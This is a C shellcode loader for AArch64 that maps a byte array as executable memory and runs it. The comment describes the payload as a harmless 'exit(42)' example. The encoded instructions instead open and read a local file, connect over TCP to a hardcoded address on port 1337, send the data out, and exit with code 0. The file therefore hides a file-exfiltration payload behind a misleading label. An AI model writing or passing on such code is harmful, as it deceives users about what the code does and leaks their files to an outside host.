#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Example AArch64 shellcode: exit(42)
unsigned char shellcode[] = {
    0xff, 0x13, 0x40, 0xd1, 0xf4, 0x3, 0x0, 0x91, 0xff, 0x43, 0x0, 0xd1, 0x0, 0x0, 0x80, 0xd2, 0x0, 0x0, 0xa0, 0xf2, 0x0, 0x0, 0xc0, 0xf2, 0x0, 0x0, 0xe0, 0xf2, 0xe0, 0x3, 0x0, 0xf9, 0x0, 0x0, 0x80, 0xd2, 0x0, 0x0, 0xa0, 0xf2, 0x0, 0x0, 0xc0, 0xf2, 0x0, 0x0, 0xe0, 0xf2, 0xe0, 0x7, 0x0, 0xf9, 0xff, 0x43, 0x0, 0xd1, 0xe0, 0x5, 0x8e, 0xd2, 0x40, 0xee, 0xad, 0xf2, 0x60, 0xec, 0xc5, 0xf2, 0x60, 0xae, 0xec, 0xf2, 0xe0, 0x3, 0x0, 0xf9, 0x80, 0xcd, 0x8c, 0xd2, 0xe0, 0xa5, 0xad, 0xf2, 0x20, 0xc, 0xce, 0xf2, 0x60, 0xe, 0xe0, 0xf2, 0xe0, 0x7, 0x0, 0xf9, 0x8, 0x7, 0x80, 0xd2, 0xe0, 0x3, 0x1f, 0xaa, 0xe1, 0x3, 0x0, 0x91, 0x2, 0x0, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xf5, 0x3, 0x0, 0xaa, 0xe0, 0x3, 0x15, 0xaa, 0xe1, 0x3, 0x14, 0xaa, 0x2, 0x0, 0x88, 0xd2, 0xe8, 0x7, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xf6, 0x3, 0x0, 0xaa, 0x40, 0x0, 0x80, 0xd2, 0x21, 0x0, 0x80, 0xd2, 0x2, 0x0, 0x80, 0xd2, 0xc8, 0x18, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xf7, 0x3, 0x0, 0xaa, 0xff, 0x43, 0x0, 0xd1, 0xe1, 0x3, 0x0, 0x91, 0x3f, 0x0, 0x0, 0x79, 0x40, 0x0, 0x80, 0x52, 0x20, 0x0, 0x0, 0x79, 0x20, 0xa7, 0x80, 0x52, 0x0, 0x4, 0xc0, 0x5a, 0x20, 0x4, 0x0, 0x79, 0x40, 0xfd, 0x80, 0xd2, 0xe0, 0x83, 0xb5, 0xf2, 0x0, 0x0, 0xc0, 0xf2, 0x0, 0x0, 0xe0, 0xf2, 0x0, 0x8, 0xc0, 0x5a, 0x20, 0x4, 0x0, 0xb9, 0xe0, 0x3, 0x17, 0xaa, 0x2, 0x2, 0x80, 0xd2, 0x68, 0x19, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xe0, 0x3, 0x17, 0xaa, 0xe1, 0x3, 0x14, 0xaa, 0xe2, 0x3, 0x16, 0xaa, 0x3, 0x0, 0x80, 0xd2, 0x4, 0x0, 0x80, 0xd2, 0x5, 0x0, 0x80, 0xd2, 0xc8, 0x19, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0x0, 0x0, 0x80, 0xd2, 0xa8, 0xb, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4
};

int main() {
    size_t size = sizeof(shellcode);
    size_t pagesize = sysconf(_SC_PAGESIZE);

    // Align size to page size
    size_t alloc_size = (size + pagesize - 1) & ~(pagesize - 1);

    // mmap as RW only
    void *mem = mmap(NULL, alloc_size,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy shellcode into memory
    memcpy(mem, shellcode, size);

    // Change protection to RX
    if (mprotect(mem, alloc_size, PROT_READ | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }

    // Call the shellcode
    void (*func)() = mem;
    func();

    // Should not reach here
    puts("Shellcode returned");
    return 0;
}
